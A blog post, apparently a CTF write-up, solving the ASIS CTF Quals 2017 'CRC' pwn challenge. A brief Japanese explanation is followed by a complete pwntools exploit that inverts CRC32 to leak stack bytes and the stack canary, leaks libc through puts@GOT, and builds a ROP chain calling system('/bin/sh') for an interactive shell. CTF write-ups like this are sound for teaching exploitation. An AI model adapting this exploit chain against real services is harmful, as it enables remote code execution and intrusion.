---
layout: post
alias: "/blog/2017/04/10/asis-ctf-quals-2017-crc/"
date: "2017-04-10T02:45:40+09:00"
tags: [ "ctf", "writeup", "asis-ctf", "pwn" ]
"target_url": [ "https://asis-ctf.ir/challenges/" ]
---

# ASIS CTF Quals 2017: CRC

## problem

```
$ nc 69.90.132.40 4002


**********WELCOME TO THE CRC32 CALCULATOR**********

------------------------
 1) Calculate a CRC     
 2) Exit                
------------------------
 Choice: 1
What is the length of your data: 3
Please send me 3 bytes to process: foo
CRC is: 0x8C736521
------------------------
 1) Calculate a CRC     
 2) Exit                
------------------------
 Choice: 

```

## solution

数字の入力と文字列の入力の全てで`gets`が使われている。
数字の入力のoverflowではcanaryに阻まれ、CRC対象の文字列をoverflowさせてもeipは取れない。
しかし後者ではCRCの計算対象へのpointerを書き換えられる(書き込み先は移動させられないが)ので、これを用いてstack上のleakが(CRCの逆計算を経由して)できる。
これを用いてcanaryを割り出しROPする。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='69.90.132.40')
parser.add_argument('port', nargs='?', default=4002, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='crcme')
parser.add_argument('--libc', default='libc6-i386_2.23-0ubuntu7_amd64.so')
parser.add_argument('--process', action='store_true')
args = parser.parse_args()
context.log_level = args.log_level
libc = ELF(args.libc)

gets_plt = 0x8048460
puts_plt = 0x8048470
puts_got = 0x8049fe4
pop_ebp_ret = 0x8048852 # pop ebp ; ret

if args.process:
    p = process(args.binary)
else:
    p = remote(args.host, args.port)

import zlib
def uncrc(value, prefix=''):
    for c in map(chr, range(256)):
        if zlib.crc32(prefix + c) % 0x100000000 == value:
            return c

def crc(length, data):
    p.recvuntil(' Choice: ')
    p.sendline('1') # Calculate a CRC
    p.recvuntil('What is the length of your data: ')
    p.sendline(str(length))
    p.recvuntil('bytes to process: ')
    p.sendline(data)
    p.recvuntil('CRC is: ')
    return int(p.recvline(), 16)

# dump stack
stack_dump = ''
for i in range(1, 100):
    value = crc(i, 'A' * 100)
    c = uncrc(value, prefix=stack_dump)
    if c is None:
        break
    stack_dump += c

log.info('stack dump:\n%s', fiddling.hexdump(stack_dump))

# find the addr of buffer
for index in range(len(stack_dump) / 4):
    addr = u32(stack_dump[index * 4:][: 4]) - 0x100
    addr = addr / 4 * 4
    if addr < 0x100: # small
        continue
    log.info('some addr: %#x', addr)

    for _ in range(16):
        if crc(16, 'A' * 100 + p32(addr)) == zlib.crc32('A' * 16) % 0x100000000:
            break
        addr += 0x20
    else:
        continue
    break
else:
    raise
while crc(16, 'A' * 100 + p32(addr - 4)) == zlib.crc32('A' * 16) % 0x100000000:
    addr -= 4
log.info('buffer addr: %#x', addr)

# leak the canary
canary = ''
for i in range(4):
    value = crc(1, 'A' * 100 + p32(addr + 104 + i))
    canary += uncrc(value)
canary = u32(canary)
log.info('canary: %#x', canary)

# leak got.puts and call system("/bin/sh");
p.recvuntil(' Choice: ')
payload = ''
payload += 'A' * 40
payload += p32(canary)
payload += 'A' * 8
payload += 'A' * 4 # ebx
payload += p32(puts_plt)
payload += p32(pop_ebp_ret)
payload += p32(puts_got)
payload += p32(gets_plt)
payload += p32(pop_ebp_ret)
payload += p32(addr)
payload += p32(addr) # addr
payload += 'A' * 4
payload += p32(addr + 12)
payload += '/bin/sh\0'
p.sendline(payload)
puts = u32(p.recvn(4))
log.info('puts: %#x', puts)
libc_base = puts - libc.symbols['puts']
log.info('libc base: %#x', libc_base)
system = libc_base + libc.symbols['system']
log.info('system: %#x', system)
p.sendline(p32(system))

# done
time.sleep(1)
p.sendline('id')
p.interactive()
```
